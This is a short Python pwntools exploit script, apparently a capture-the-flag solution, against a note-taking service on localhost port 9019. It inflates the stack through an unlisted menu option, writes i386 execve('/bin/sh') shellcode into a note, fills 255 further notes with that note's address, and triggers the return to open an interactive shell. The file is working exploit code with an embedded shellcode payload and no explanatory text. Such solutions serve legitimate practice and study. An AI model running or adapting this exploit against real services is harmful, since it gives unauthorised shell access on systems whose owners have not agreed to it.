#!/usr/bin/env python

from pwn import *

p = remote('localhost', 9019)


def wait_menu():
    p.recvuntil('5. exit\n')


def create_note():
    wait_menu()
    p.sendline('1')
    p.recvuntil(' no ')
    num = int(p.recvline()[:-1])
    p.recvuntil(' [')
    addr = int(p.recvn(8), 16)
    return (num, addr)


def write_note(no, content):
    wait_menu()
    p.sendline('2')
    p.recvuntil('no?\n')
    p.sendline(str(no))
    p.recvuntil('byte)\n')
    p.sendline(content)


def delete_note(no):
    wait_menu()
    p.sendline('4')
    p.recvuntil('no?\n')
    p.sendline(str(no))


# increase stack
for i in range(5000):
    wait_menu()
    p.sendline('6')
    log.info('stack %d' % i)

# write shellcode
first_no, first_addr = create_note()

wait_menu()
p.sendline('2')
p.recvuntil('no?\n')
p.sendline('0')
p.recvuntil('byte)\n')
p.sendline('jhh///sh/binj\x0bX\x89\xe31\xc9\x99\xcd\x80')

for i in range(255):
    # create note
    no, addr = create_note()
    log.info('no: %d / addr: %x' % (no, addr))
    write_note(no, p32(first_addr) * 1023)

# return
wait_menu()
p.sendline('5')

p.interactive()
